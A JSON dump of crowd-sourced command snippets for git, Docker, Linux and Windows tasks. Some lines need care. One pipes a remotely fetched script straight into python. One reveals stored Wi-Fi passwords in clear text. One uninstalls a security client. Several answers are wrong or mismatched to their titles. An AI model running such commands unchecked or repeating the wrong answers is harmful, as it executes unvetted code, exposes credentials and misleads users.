    "description": "    $ sudo fdisk /dev/sdb -l      Disk /dev/sdb: 250.1 GB, 250059350016 bytes     255 heads, 63 sectors/track, 30401 cylinders, total 488397168 sectors     Units = sectors of 1 * 512 = 512 bytes     Sector size (logical/physical): 512 bytes / 512 bytes     I/O size (minimum/optimal): 512 bytes / 512 bytes     Disk identifier: 0x0002da94         Device Boot      Start         End      Blocks   Id  System     /dev/sdb1   *        2048   475920383   237959168   83  Linux     /dev/sdb2       475922430   488396799     6237185    5  Extended     /dev/sdb5       475922432   488396799     6237184   82  Linux swap / Solaris \nmount /dev/sdb1 /mnt/usb \n",
    "reg_date": "2021-10-11T22:07:05.000Z"
  },
  {
    "id": 2484,
    "keyword": null,
    "link": null,
    "title": " how to pip install asyncio",
    "description": "pip install asyncio\n",
    "reg_date": "2021-10-11T22:07:06.000Z"
  },
  {
    "id": 2485,
    "keyword": null,
    "link": null,
    "title": " how to pip install tensorflow",
    "description": "######## for Python 2.7 pip install --upgrade pip pip install --upgrade tensorflow  ######## for Python 3.n pip3 install --upgrade pip pip3 install --upgrade tensorflow\npy -m pip install tensorflow # contact me on discord if you need any help deep#3775\npip install tensorflow\n",
    "reg_date": "2021-10-11T22:07:06.000Z"
  },
  {
    "id": 2486,
    "keyword": null,
    "link": null,
    "title": " how to prevent bash or zsh from interpreting special characters",
    "description": "# Short answer: Escape the special characters with backslash e.g.: echo This_is_a_wildcard_* --> zsh: no matches found: This_is_a_wildcard_* echo This_is_a_wildcard_\\* --> This_is_a_wildcard_*  # Using double quotes around the argument works as well, e.g.: echo \"This is a wildcard *\" --> This is a wildcard *  # Note, some of the special characters interpreted by bash/zsh include: ' \" ! $ & [ ] ( ) ? * \n",
    "reg_date": "2021-10-11T22:07:06.000Z"
  },
  {
    "id": 2487,
    "keyword": null,
    "link": null,
    "title": " how to print the active user id in linux",
    "description": "#comman to print the active user ID. whoami\n",
    "reg_date": "2021-10-11T22:07:07.000Z"
  },
  {
    "id": 2488,
    "keyword": null,
    "link": null,
    "title": " how to pull and overwrite local changes git",
    "description": "git fetch --all git reset --hard origin/master\n",
    "reg_date": "2021-10-11T22:07:07.000Z"
  },
  {
    "id": 2489,
    "keyword": null,
    "link": null,
    "title": " how to pull from a particular branch in git",
    "description": "git pull origin <branch> \ngit pull origin other-branch\ngit clone -b <branch> <remote_repo> \n",
    "reg_date": "2021-10-11T22:07:07.000Z"
  },
  {
    "id": 2490,
    "keyword": null,
    "link": null,
    "title": " how to pull submodules git",
    "description": "git pull --recurse-submodules\ngit submodule update --recursive --remote \ngit submodule update --init --recursive\ngit clone --recurse-submodules\ngit submodule update \n",
    "reg_date": "2021-10-11T22:07:08.000Z"
  },
  {
    "id": 2491,
    "keyword": null,
    "link": null,
    "title": " how to push code on bitbucket",
    "description": "git remote add origin <the URL for your Bitbucket repository>  git push -u origin master git init git add --all git commit -m \"Initial Commit\"\ngit remote add origin <the URL for your Bitbucket repository>  git push -u origin master\ngit init git add --all git commit -m \"Initial Commit\"\n",
    "reg_date": "2021-10-11T22:07:08.000Z"
  },
  {
    "id": 2492,
    "keyword": null,
    "link": null,
    "title": " how to push local code to git repository",
    "description": "Create a new repository on the command line git init git add . git commit -m \"first commit\" git branch -M main git remote add origin https://github.com/neetigyachahar/codebox.git git push -u origin main\ngit init git add . git commit -m \"First commit\" git remote add origin <remote repository URL> git remote -v git branch -M main git push -u origin main  1- # Create a new repository on GitHub. To avoid errors, do not initialize the new repository with README, license, or gitignore files. You can add these files after your project has been pushed to GitHub.  2- # Open Terminal.  3- # Change the current working directory to your local project.  4- # Initialize the local directory as a Git repository. $ git init  5- # Add the files in your new local repository. This stages them for the first commit. $ git add . # Adds the files in the local repository and stages them for commit. To unstage a file, use 'git reset HEAD YOUR-FILE'.  6- # Commit the files that you've staged in your local repository. $ git commit -m \"First commit\" # Commits the tracked changes and prepares them to be pushed to a remote repository. To remove this commit and modify the file, use 'git reset --soft HEAD~1' and commit and add the file again.  7- # At the top of your GitHub repository's Quick Setup page, click  to copy the remote repository URL.  8- # In Terminal, add the URL for the remote repository where your local repository will be pushed. $ git remote add origin <remote repository URL> # Sets the new remote $ git remote -v # Verifies the new remote URL  9- # Push the changes in your local repository to GitHub. $ git branch -M main $ git push -u origin main # Pushes the changes in your local repository up to the remote repository you specified as the origin\necho \"# kiels-excel-sheets\" >> README.md git init git add README.md git commit -m \"first commit\" git branch -M main git remote add origin https://github.com/kielSDeM/kiels-excel-sheets.git git push -u origin main\n# 1) Create a new repository on GitHub.  # To avoid errors, do not initialize the new repository with README, license, or gitignore files. You can add these files after your project has been pushed to GitHub.  # 2) Open Terminal. # 3) Change the current working directory to your local project. # 4) Initialize the local directory as a Git repository. $ git init   # 5) Add the files in your new local repository.  # This stages them for the first commit. $ git add .  # 6)  Adds the files in the local repository and stages them for commit.  # To unstage a file, use 'git reset HEAD YOUR-FILE'. # Commit the files that you've staged in your local repository. $ git commit -m \"First commit\"  # 7) Commits the tracked changes and prepares them to be pushed to a remote  # repository.  # To remove this commit and modify the file, use 'git reset --soft HEAD~1' and  # commit and add the file again.  # 8) At the top of your GitHub repository's Quick Setup page, click  to copy  # the remote repository URL.  # 9) Copy remote repository URL field # 10) In Terminal, add the URL for the remote repository where your local repository will be pushed. $ git remote add origin **remote repository URL** # Sets the new remote $ git remote -v # Verifies the new remote URL  # 11) Push the changes in your local repository to GitHub. $ git push -u origin main # Pushes the changes in your local repository up to the remote repository you specified as the origin\nWe make a change in one branch, and we want carry that change to another branch. In order two merge two branches, we need to 1. Switch to the branch where we want to take the changes to. git checkout master 2. Run the merge command by mentioning the branch name where the changes are. git merge develop Takes the changes from develop and merges into my current branch (master) git branch -d <branch_name> deletes the branch. If we have unmerged changes, this command gives a warning and does not delete. git branch -D <branch_name> deletes the branch even if it has unmerged changes. Gives no warning. git push --set-upstream origin <branch_name> it creates a new branch with given name in the remote and pushes the changes from local branch to the new branch.\n",
    "reg_date": "2021-10-11T22:07:08.000Z"
  },
  {
    "id": 2493,
    "keyword": null,
    "link": null,
    "title": " how to query mongodb with like",
    "description": "db.users.find({\"name\": /.*m.*/});  db.users.find({\"name\": /m/});  Items.find({\"description\": {$regex: \".*\" + variable + \".*\"}}).fetch();\ndb.users.find({\"name\": /m/}) or db.users.find({\"name\": /.*m.*/})  You're looking for something that contains \"m\" somewhere (SQL's '%' operator is equivalent to Regexp's '.*'),  not something that has \"m\" anchored to the beginning of the string.\ndb.collection.find( { \"url\": { \"$regex\": \".*a.*\"} } );\ndb.users.find({\"name\": /m/})\n",
    "reg_date": "2021-10-11T22:07:08.000Z"
  },
  {
    "id": 2494,
    "keyword": null,
    "link": null,
    "title": " how to read temperature in linux",
    "description": "cat /sys/class/thermal/thermal_zone0/temp  thermal_zone0 can be different\n",
    "reg_date": "2021-10-11T22:07:08.000Z"
  },
  {
    "id": 2495,
    "keyword": null,
    "link": null,
    "title": " how to reboot kali linux with commands",
    "description": "#To reboot kali type sudo reboot #in cmd of kali\n",
    "reg_date": "2021-10-11T22:07:09.000Z"
  },
  {
    "id": 2496,
    "keyword": null,
    "link": null,
    "title": " how to reload bashrc",
    "description": ". ~/.bashrc\nsource /etc/bash.bashrc\nsource ~/.bachrc\n",
    "reg_date": "2021-10-11T22:07:09.000Z"
  },
  {
    "id": 2497,
    "keyword": null,
    "link": null,
    "title": " how to reload docker nginx",
    "description": "$ docker exec -it nginx-server nginx -s reload 2016/08/18 09:52:38 [notice] 19#19: signal process started \n",
    "reg_date": "2021-10-11T22:07:09.000Z"
  },
  {
    "id": 2498,
    "keyword": null,
    "link": null,
    "title": " how to remove .env file from git cache",
    "description": "git rm .env --cached git commit -m \"Stopped tracking .env File\" \n",
    "reg_date": "2021-10-11T22:07:09.000Z"
  },
  {
    "id": 2499,
    "keyword": null,
    "link": null,
    "title": " how to remove a directory recursively ubuntu",
    "description": "rm -rf foldername\n",
    "reg_date": "2021-10-11T22:07:09.000Z"
  },
  {
    "id": 2500,
    "keyword": null,
    "link": null,
    "title": " how to remove a file inside jar file in linux",
    "description": "zip -d file.jar unwanted_file.txt \n",
    "reg_date": "2021-10-11T22:07:09.000Z"
  },
  {
    "id": 2501,
    "keyword": null,
    "link": null,
    "title": " how to remove a package in laravel 8",
    "description": "composer remove vendor/package\ncomposer remove vendor/package \n",
    "reg_date": "2021-10-11T22:07:10.000Z"
  },
  {
    "id": 2502,
    "keyword": null,
    "link": null,
    "title": " how to remove a plugin from ionic project",
    "description": "cordova plugin remove 'nameOfPlugin'\n",
    "reg_date": "2021-10-11T22:07:10.000Z"
  },
  {
    "id": 2503,
    "keyword": null,
    "link": null,
    "title": " how to remove all docker container at once",
    "description": "to remove all the docker containers at once. $docker rm $(docker ps -a -q)  to remove all the docker images at once. $docker rmi $(docker images -a -q)\n",
    "reg_date": "2021-10-11T22:07:10.000Z"
  },
  {
    "id": 2504,
    "keyword": null,
    "link": null,
    "title": " how to remove an apt repository",
    "description": "sudo add-apt-repository --remove ppa:whatever/ppa # or sudo apt-add-repository --remove 'deb some/repo your_distro main'\n",
    "reg_date": "2021-10-11T22:07:10.000Z"
  },
  {
    "id": 2505,
    "keyword": null,
    "link": null,
    "title": " how to remove base from command prompt",
    "description": "conda config --set auto_activate_base false\n",
    "reg_date": "2021-10-11T22:07:10.000Z"
  },
  {
    "id": 2506,
    "keyword": null,
    "link": null,
    "title": " how to remove cisco umbrella",
    "description": "1. Open Powershell in Administrative Mode 2. Paste The Code Below & Enter  wmic Product where \"name='Umbrella Roaming Client'\" call uninstall 3. Restart PC & Cisco Umbrella | Umbrela Roaming Client Will Be Gone  ## Contact Rigby#9052 on Discord If Any Problems Occured ##\n",
    "reg_date": "2021-10-11T22:07:11.000Z"
  },
  {
    "id": 2507,
    "keyword": null,
    "link": null,
    "title": " how to remove git from project",
    "description": "/* Remove Git tracking from an entire folder/directory */  cd project-name // Navigate to the project directory rm -rf .git // Remove git tracking  \nrm -rf .git* \n// On windows del /F /S /Q /A .git\n",
    "reg_date": "2021-10-11T22:07:11.000Z"
  },
  {
    "id": 2508,
    "keyword": null,
    "link": null,
    "title": " how to remove git from ubuntu 21",
    "description": "$ sudo apt-get remove --auto-remove git \n$ sudo apt-get purge --auto-remove git \n$ sudo apt-get remove git \n$ sudo apt-get purge git \n",
    "reg_date": "2021-10-11T22:07:11.000Z"
  },
  {
    "id": 2509,
    "keyword": null,
    "link": null,
    "title": " how to remove git hooks",
    "description": "rm -f my_project/.git/hooks/pre_commit\n",
    "reg_date": "2021-10-11T22:07:11.000Z"
  },
  {
    "id": 2510,
    "keyword": null,
    "link": null,
    "title": " how to remove git initialization",
    "description": "rm -rf .git \n",
    "reg_date": "2021-10-11T22:07:11.000Z"
  },
  {
    "id": 2511,
    "keyword": null,
    "link": null,
    "title": " how to remove heroku from git",
    "description": "git remote rm heroku\n",
    "reg_date": "2021-10-11T22:07:11.000Z"
  },
  {
    "id": 2512,
    "keyword": null,
    "link": null,
    "title": " how to remove node modules from git",
    "description": "# Do the below steps - # Make .gitignore file. # Run below commands in your terminal  git rm -r --cached node_modules  git commit -am \"node_modules be gone!\"  git push origin master\nremove node_modules git rm -r --cached node_modules  git commit -am \"node_modules be gone!\"  git push origin master\n",
    "reg_date": "2021-10-11T22:07:11.000Z"
  },
  {
    "id": 2513,
    "keyword": null,
    "link": null,
    "title": " how to remove nvm",
    "description": "Essentially you'd need to reverse the steps in install.sh - remove any nvm lines from ~/.bash_profile (and/or ~/.profile), rm -rf ~/.nvm, and either reopen your shell, or re-source your bash profile.  However, simply removing the nvm commands from your .bash_profile or .profile should be more than sufficient.  someone else said this:  rm -rf ~/.nvm rm -rf ~/.npm rm -rf ~/.bower\n",
    "reg_date": "2021-10-11T22:07:12.000Z"
  },
  {
    "id": 2514,
    "keyword": null,
    "link": null,
    "title": " how to remove samba ubuntu",
    "description": "sudo apt-get autoremove --purge samba sudo apt-get remove samba sudo apt-get autoremove samba\n",
    "reg_date": "2021-10-11T22:07:12.000Z"
  },
  {
    "id": 2515,
    "keyword": null,
    "link": null,
    "title": " how to remove sudo permission in from download",
    "description": "chown -R $USER <directory> \n",
    "reg_date": "2021-10-11T22:07:12.000Z"
  },
  {
    "id": 2516,
    "keyword": null,
    "link": null,
    "title": " how to remove terminator from ubuntu",
    "description": "sudo apt-get remove terminator\nsudo add-apt-repository ppa:gnome-terminator\n",
    "reg_date": "2021-10-11T22:07:12.000Z"
  },
  {
    "id": 2517,
    "keyword": null,
    "link": null,
    "title": " how to remove unused pip dependencies on mac",
    "description": "pip freeze | xargs pip uninstall -y\n",
    "reg_date": "2021-10-11T22:07:12.000Z"
  },
  {
    "id": 2518,
    "keyword": null,
    "link": null,
    "title": " how to remove windows service",
    "description": "SC STOP shortservicename SC DELETE shortservicename  Note: You need to run the command prompt as an administrator, not just logged in as the administrator, but also with administrative rights. If you get errors above about not having the necessary access rights to stop and/or delete the service, run the command prompt as an administrator. You can do this by searching for the command prompt on your start menu and then right-clicking and selecting \"Run as administrator\". Note to PowerShell users: sc is aliased to set-content. So sc delete service will actually create a file called delete with the content service. To do this in Powershell, use sc.exe delete service instead  If you need to find the short service name of a service, use the following command to generate a text file containing a list of services and their statuses:  SC QUERY state= all >\"C:\\Service List.txt\" For a more concise list, execute this command:  SC QUERY state= all | FIND \"_NAME\" The short service name will be listed just above the display name, like this:  SERVICE_NAME: MyService DISPLAY_NAME: My Special Service And thus to delete that service:  SC STOP MyService SC DELETE MyService\nSC DELETE shortservicename\n",
    "reg_date": "2021-10-11T22:07:13.000Z"
  },
  {
    "id": 2519,
    "keyword": null,
    "link": null,
    "title": " how to rename a file in ubuntu using terminal",
    "description": "mv oldnamefile1 newnamefile1\n",
    "reg_date": "2021-10-11T22:07:13.000Z"
  },
  {
    "id": 2520,
    "keyword": null,
    "link": null,
    "title": " how to rename git branch fro master to main",
    "description": "$ git branch -m master main\n# Step 1  # create main branch locally, taking the history from master git branch -m master main  # Step 2  # push the new local main branch to the remote repo (GitHub)  git push -u origin main  # Step 3 # switch the current HEAD to the main branch git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main  # Step 4 # change the default branch on GitHub to main # https://docs.github.com/en/github/administering-a-repository/setting-the-default-branch  # Step 5 # delete the master branch on the remote git push origin --delete master\n$ git push origin --delete master \n",
    "reg_date": "2021-10-11T22:07:13.000Z"
  },
  {
    "id": 2521,
    "keyword": null,
    "link": null,
    "title": " how to reset git master branch by remote",
    "description": "git fetch origin git reset --hard origin/master \ngit checkout mybranch git reset --hard origin/mybranch\n",
    "reg_date": "2021-10-11T22:07:13.000Z"
  },
  {
    "id": 2522,
    "keyword": null,
    "link": null,
    "title": " how to restart apache2 in ubuntu 20.04",
    "description": "$ sudo systemctl restart apache2 \n",
    "reg_date": "2021-10-11T22:07:13.000Z"
  },
  {
    "id": 2523,
    "keyword": null,
    "link": null,
    "title": " how to restart docker linux",
    "description": "$ sudo systemctl start docker \n",
    "reg_date": "2021-10-11T22:07:14.000Z"
  },
  {
    "id": 2524,
    "keyword": null,
    "link": null,
    "title": " how to restart mongodb server in ubuntu",
    "description": "sudo service mongod start \nsudo systemctl restart mongodb # it will restarts running mongodb server\n",
    "reg_date": "2021-10-11T22:07:14.000Z"
  },
  {
    "id": 2525,
    "keyword": null,
    "link": null,
    "title": " how to restart network manager in ubuntu",
    "description": "$ sudo service network-manager restart\nsudo service network-manager restart \nLinux Network #To Restart network $ sudo /etc/init.d/networking restart  #To stop and start use the following option (do not run them over remote ssh session as you will get disconnected): $ sudo /etc/init.d/networking stop $ sudo /etc/init.d/networking start  #Debian/Ubuntu Linux with systemd, run: $ sudo systemctl restart networking            or  $ sudo systemctl restart NetworkManager.service  \n",
    "reg_date": "2021-10-11T22:07:14.000Z"
  },
  {
    "id": 2526,
    "keyword": null,
    "link": null,
    "title": " how to restart psql in linux",
    "description": "sudo service postgresql restart # To restart the postgresql service\nsudo /etc/init.d/postgresql restart\n",
    "reg_date": "2021-10-11T22:07:14.000Z"
  },
  {
    "id": 2527,
    "keyword": null,
    "link": null,
    "title": " how to restart the network in ubuntu",
    "description": "$ sudo service network-manager restart\n",
    "reg_date": "2021-10-11T22:07:14.000Z"
  },
  {
    "id": 2528,
    "keyword": null,
    "link": null,
    "title": " how to return to latest version on git",
    "description": "// we need to type both of them git fetch origin git reset --hard origin/master\n",
    "reg_date": "2021-10-11T22:07:14.000Z"
  },
  {
    "id": 2529,
    "keyword": null,
    "link": null,
    "title": " how to run a train animation in linux terminal",
    "description": "$ LS\n",
    "reg_date": "2021-10-11T22:07:15.000Z"
  },
  {
    "id": 2530,
    "keyword": null,
    "link": null,
    "title": " how to run a update comand in linux",
    "description": "sudo apt update && sudo apt upgrade -y #or use it seperately sudo apt update sudo apt upgrade #you make wanna run below command to remove unwanted #and free up some space sudo apt autoremove\nsudo apt-get update && sudo apt-get upgrade\n#gets package(s) update definitions sudo apt update #upgrades the package(s) for which update definitions are received sudo apt upgrade \nsudo do-release-upgrade\n",
    "reg_date": "2021-10-11T22:07:15.000Z"
  },
  {
    "id": 2531,
    "keyword": null,
    "link": null,
    "title": " how to run an appimage in linux",
    "description": "$ chmod a+x filename.AppImage\n",
    "reg_date": "2021-10-11T22:07:15.000Z"
  },
  {
    "id": 2532,
    "keyword": null,
    "link": null,
    "title": " how to run docker without sudo",
    "description": "$ sudo groupadd docker $ sudo usermod -aG docker $USER $ newgrp docker \n# my case solution sudo setfacl -m user:$USER:rw /var/run/docker.sock  #other solution sudo usermod -aG docker $USER  #an other solution sudo groupadd docker sudo gpasswd -a $USER docker docker run hello-world\n# No sudo with docker > sudo groupadd docker > sudo gpasswd -a username docker > sudo service docker restart  \n",
    "reg_date": "2021-10-11T22:07:15.000Z"
  },
  {
    "id": 2533,
    "keyword": null,
    "link": null,
    "title": " how to run flutter on google chrome",
    "description": "$ flutter channel master $ flutter upgrade $ flutter config --enable-web #downloads sky_engine and sdk tools then shows devices list $ flutter devices   $ flutter create test_app $ flutter run -d chrome  \n",
    "reg_date": "2021-10-11T22:07:15.000Z"
  },
  {
    "id": 2534,
    "keyword": null,
    "link": null,
    "title": " how to run kafka as a service on linux",
    "description": "",
    "reg_date": "2021-10-11T22:07:15.000Z"
  },
  {
    "id": 2535,
    "keyword": null,
    "link": null,
    "title": " how to run shell script in linux",
    "description": "# Give the script file correct permssions $chmod 744 <name of scipt file e.g script.sh> $ chmod 744 script.sh   #now the file is ready to run run it with $ ./<name of scirpt file e.g. script.sh> $ ./script.sh\nchmod +x <fileName> sudo ./<fileName>\nchmod +x <fileName> ./fileName.  # or use ->. bash fileName\n$ ./script_name.sh  // if it need sudo permission the type: $ sudo ./script_name.sh\ninclude  #!/bin/bash (1st line inside yourfile.sh)  to run ./yourfile.sh  if you do not include that line bash yourfile.sh\n# method 1 chmod +x <filename> ./<filename>  # method 2 sh <filename>.sh  # method 3 (Only for bash script) bash <filename>.sh\n",
    "reg_date": "2021-10-11T22:07:16.000Z"
  },
  {
    "id": 2536,
    "keyword": null,
    "link": null,
    "title": " how to run tasm program in ubuntu",
    "description": "tasm filename.asm tlink filename   filename.exe \n",
    "reg_date": "2021-10-11T22:07:16.000Z"
  },
  {
    "id": 2537,
    "keyword": null,
    "link": null,
    "title": " how to run ubuntu in docker",
    "description": "sudo apt-get update sudo apt-get upgrade sudo apt install docker.io systemctl start docker systemctl enable docker docker --version\n#make sure you have install docker sudo systemctl start docker sudo docker pull ubuntu  sudo docker run -it ubuntu \nsystemctl start docker # to start docker from terminal\ndocker run -it ubuntu\n",
    "reg_date": "2021-10-11T22:07:16.000Z"
  },
  {
    "id": 2538,
    "keyword": null,
    "link": null,
    "title": " how to save iptables",
    "description": "iptables-save\n",
    "reg_date": "2021-10-11T22:07:16.000Z"
  },
  {
    "id": 2539,
    "keyword": null,
    "link": null,
    "title": " how to save updated commits to another branch",
    "description": "git stash git checkout other-branch git stash pop \n",
    "reg_date": "2021-10-11T22:07:16.000Z"
  },
  {
    "id": 2540,
    "keyword": null,
    "link": null,
    "title": " how to scp or ssh to gcp instance",
    "description": "gcloud compute scp FILENAME USER@INSTANCE:DESTINATION_DIR\n",
    "reg_date": "2021-10-11T22:07:16.000Z"
  },
  {
    "id": 2541,
    "keyword": null,
    "link": null,
    "title": " how to secure letsencrypt on ubuntu 20.04 with nginx",
    "description": "sudo apt install certbot python3-certbot-nginx\n",
    "reg_date": "2021-10-11T22:07:17.000Z"
  },
  {
    "id": 2542,
    "keyword": null,
    "link": null,
    "title": " how to see a imagem quickly from terminal",
    "description": "eog image.png\n",
    "reg_date": "2021-10-11T22:07:17.000Z"
  },
  {
    "id": 2543,
    "keyword": null,
    "link": null,
    "title": " how to see all branches in git",
    "description": "git branch -a\ngit fetch --all \n$ git branch -a. If you require only listing the remote branches from Git Bash then use this command: $ git branch -r. You may also use the show-branch command for seeing the branches and their commits as follows: $ git show-branch.\ngit branch -l\ngit branch #To see local branches, run this command git branch -r #To see remote branches, run this command git branch -a #To see all local and remote branches, run this command\ngit checkout --detach git fetch origin '+refs/heads/*:refs/heads/*' \n",
    "reg_date": "2021-10-11T22:07:17.000Z"
  },
  {
    "id": 2544,
    "keyword": null,
    "link": null,
    "title": " how to see commited file names in command line git",
    "description": "$ git diff-tree --no-commit-id --name-only -r bd61ad98 index.html javascript/application.js javascript/ie6.js \n",
    "reg_date": "2021-10-11T22:07:17.000Z"
  },
  {
    "id": 2545,
    "keyword": null,
    "link": null,
    "title": " how to see remote branch git",
    "description": "git remote show origin\n",
    "reg_date": "2021-10-11T22:07:17.000Z"
  },
  {
    "id": 2546,
    "keyword": null,
    "link": null,
    "title": " how to see the difference between two files in git",
    "description": "# It compare file with previously commited file. git diff HEAD <file>\n",
    "reg_date": "2021-10-11T22:07:17.000Z"
  },
  {
    "id": 2547,
    "keyword": null,
    "link": null,
    "title": " how to see wifi password on iphone",
    "description": "1. Open Commands Promt (Doesnt Matter if Administartive mode) 2. Paste This Code & Press Enter  netsh wlan show profile name=INTERNET-NAME key=clear 3. Search For Something Called \"Key Content\", Thats Your Password  ## NOTE : This Might Not Work on Publice Networks Like Hospital, ## School, Muncipality Etc Networks\n",
    "reg_date": "2021-10-11T22:07:17.000Z"
  },
  {
    "id": 2548,
    "keyword": null,
    "link": null,
    "title": " how to see your ip in cmd",
    "description": "ipconfig   BE AWARE! : This is only your local ip, if you want to see your public ip you can  go to https://ipchicken.com\nipconfig/all\n@echo off setlocal mode con:cols=110 lines=30  :start cls  set /p localWireless=add adb local wireless usb ip address ? & echo %localWireless% | findstr /i /r [A-za-z] cls  if %errorlevel% equ 1 (   msg %username% 'ip address is valid'   goto start ) else (   msg %username% 'ip address is not valid'   goto start )  pause goto start\n",
    "reg_date": "2021-10-11T22:07:18.000Z"
  },
  {
    "id": 2549,
    "keyword": null,
    "link": null,
    "title": " how to send desktop notification in ubuntu",
    "description": "notify-send Hi_Ubuntu_user \n",
    "reg_date": "2021-10-11T22:07:18.000Z"
  },
  {
    "id": 2550,
    "keyword": null,
    "link": null,
    "title": " how to send notification in linux",
    "description": "notify-send \"the message\"\n",
    "reg_date": "2021-10-11T22:07:18.000Z"
  },
  {
    "id": 2551,
    "keyword": null,
    "link": null,
    "title": " how to set code as default for git commit",
    "description": "git config --global core.editor \"code --wait\"\n",
    "reg_date": "2021-10-11T22:07:18.000Z"
  },
  {
    "id": 2552,
    "keyword": null,
    "link": null,
    "title": " how to set environment variable in ubuntu",
    "description": "sudo -H gedit /etc/environment\nexport VARNAME=\"my value\"      # shorter, less portable version\n# syntax  # setenv SHELL *<filepath-of-file-containing-environment-settings>  # example setenv SHELL /usr/bin/bash\n# Linux - Bash  # syntax  # export *<variable-name>=*<variable-value>;  # example  export ORACLE_SID='sales_database';\n# Linux - Bash   # syntax  # export *<variable-name>=*<variable-value>;  # example  export ORACLE_SID='sales_database';\n",
    "reg_date": "2021-10-11T22:07:18.000Z"
  },
  {
    "id": 2553,
    "keyword": null,
    "link": null,
    "title": " how to set remote url in git",
    "description": "git remote set-url origin new.git.url/here\ngit remote set-url origin https://hostname/USERNAME/REPOSITORY.git\n# Overwriting an existing git url: git remote set-url origin <git_url>\n$ git remote add origin https://github.com/user/repo.git # Set a new remote  $ git remote -v # Verify new remote > origin  https://github.com/user/repo.git (fetch) > origin  https://github.com/user/repo.git (push)\ngit remote set-url origin https://github.com/USERNAME/REPOSITORY.git\ngit remote set-url origin new.git.url/here \n",
    "reg_date": "2021-10-11T22:07:18.000Z"
  },
  {
    "id": 2554,
    "keyword": null,
    "link": null,
    "title": " how to set wsl 2 as default",
    "description": "wsl --set-default-version 2\n",
    "reg_date": "2021-10-11T22:07:18.000Z"
  },
  {
    "id": 2555,
    "keyword": null,
    "link": null,
    "title": " how to share gatsby project on lan",
    "description": "gatsby develop -H 0.0.0.0 -p 8000\n",
    "reg_date": "2021-10-11T22:07:19.000Z"
  },
  {
    "id": 2556,
    "keyword": null,
    "link": null,
    "title": " how to shutdown port in windows",
    "description": "taskkill /F /PID PORT_NUMBER\n# Print PID of process bound on that port. fuser 8080/tcp  # Kill that process fuser -k 8080/tcp\nnetstat  -ano  |  findstr  < Port Number > taskkill  /F  /PID  < Process Id >\n",
    "reg_date": "2021-10-11T22:07:19.000Z"
  },
  {
    "id": 2557,
    "keyword": null,
    "link": null,
    "title": " how to shutdown raspbian command",
    "description": "#poweroff sudo poweroff #reboot sudo reboot\n",
    "reg_date": "2021-10-11T22:07:19.000Z"
  },
  {
    "id": 2558,
    "keyword": null,
    "link": null,
    "title": " how to shutdown ubuntu",
    "description": "sudo shutdown now\nsudo poweroff\nCtrl+Alt+K\n",
    "reg_date": "2021-10-11T22:07:19.000Z"
  },
  {
    "id": 2559,
    "keyword": null,
    "link": null,
    "title": " how to sign into github from terminal",
    "description": "$ git config --global user.name \"John Doe\" $ git config --global user.email johndoe@example.com  or to see the signed in user  git config --list\n",
    "reg_date": "2021-10-11T22:07:19.000Z"
  },
  {
    "id": 2560,
    "keyword": null,
    "link": null,
    "title": " how to speedtest on bash",
    "description": "curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python - \npip install --user speedtest-cli\n",
    "reg_date": "2021-10-11T22:07:20.000Z"
  },
  {
    "id": 2561,
    "keyword": null,
    "link": null,
    "title": " how to start a web server linux",
    "description": " #how to start a web server linux  sudo service apache2 start\n",
    "reg_date": "2021-10-11T22:07:20.000Z"
  },
  {
    "id": 2562,
    "keyword": null,
    "link": null,
    "title": " how to start docker",
    "description": "$ sudo systemctl start docker \nsystemctl start docker.service #(OR) systemctl start docker # it will start docker\n$ docker start my_container \n#make sure docker is installed  docker run -dp 80:80 docker/getting-started\n",
    "reg_date": "2021-10-11T22:07:20.000Z"
  },
  {
    "id": 2563,
    "keyword": null,
    "link": null,
    "title": " how to start nginx in linux",
    "description": "sudo systemctl restart nginx\nsudo apt update sudo apt install nginx \n",
    "reg_date": "2021-10-11T22:07:20.000Z"
  },
  {
    "id": 2564,
    "keyword": null,
    "link": null,
    "title": " how to start psql in linux",
    "description": "sudo service postgresql start # To start the postgresql service\nbrew services start postgresql \nbrew services stop postgresql \nsudo service postgresql-9.3 initdb\n",
    "reg_date": "2021-10-11T22:07:20.000Z"
  },
  {
    "id": 2565,
    "keyword": null,
    "link": null,
    "title": " how to start xampp in ubuntu",
    "description": "sudo /opt/lampp/lampp start cd /opt/lampp/ ls sudo ./manager-linux-x64.run \n>>> cd /opt/lampp/  >>> ls   >>> sudo ./manager-linux-x64.run \nsudo /opt/lampp/manager-linux-x64.run\n sudo '/opt/lampp/xampp' start  sudo '/opt/lampp/xampp' reload  sudo '/opt/lampp/xampp' restart  sudo '/opt/lampp/xampp' stop \nsudo chmod 755 xampp-linux-x64-7.3.5.1-installer.run\n$ sudo apt install net-tools /*    */\n",
    "reg_date": "2021-10-11T22:07:20.000Z"
  },
  {
    "id": 2566,
    "keyword": null,
    "link": null,
    "title": " how to steal stolen deleted code... from github...",
    "description": "come on dood wtf really \n",
    "reg_date": "2021-10-11T22:07:21.000Z"
  },
  {
    "id": 2567,
    "keyword": null,
    "link": null,
    "title": " how to stop a node server from running",
    "description": "ps aux | grep node  kill -9 PROCESS_ID\n",
    "reg_date": "2021-10-11T22:07:21.000Z"
  },
  {
    "id": 2568,
    "keyword": null,
    "link": null,
    "title": " how to stop a web server linux",
    "description": "# how to stop a web server linux sudo service apache2 stop\n",
    "reg_date": "2021-10-11T22:07:21.000Z"
  },
  {
    "id": 2569,
    "keyword": null,
    "link": null,
    "title": " how to stop an application on a port",
    "description": "npx kill-port 8080 \n",
    "reg_date": "2021-10-11T22:07:21.000Z"
  },
  {
    "id": 2570,
    "keyword": null,
    "link": null,
    "title": " how to stop build in heroku",
    "description": "heroku plugins:install heroku-builds heroku builds:cancel -a YOUR_HEROKU_APP_NAME\n",
    "reg_date": "2021-10-11T22:07:21.000Z"
  },
  {
    "id": 2571,
    "keyword": null,
    "link": null,
    "title": " how to stop docker in ubuntu",
    "description": "sudo systemctl stop docker #To stop docker from terminal.\n",
    "reg_date": "2021-10-11T22:07:22.000Z"
  },
  {
    "id": 2572,
    "keyword": null,
    "link": null,
    "title": " how to stop gunicorn",
    "description": "pkill gunicorn\n",
    "reg_date": "2021-10-11T22:07:22.000Z"
  },
  {
    "id": 2573,
    "keyword": null,
    "link": null,
    "title": " how to stop mongodb server in ubuntu",
    "description": "sudo systemctl stop mongodb # it will stop running mongodb server\n",
    "reg_date": "2021-10-11T22:07:22.000Z"
  },
  {
    "id": 2574,
    "keyword": null,
    "link": null,
    "title": " how to stop oneko",
    "description": "1. On terminal 2. Type: \tps -ef | grep oneko     kill PID_no\n",
    "reg_date": "2021-10-11T22:07:22.000Z"
  },
  {
    "id": 2575,
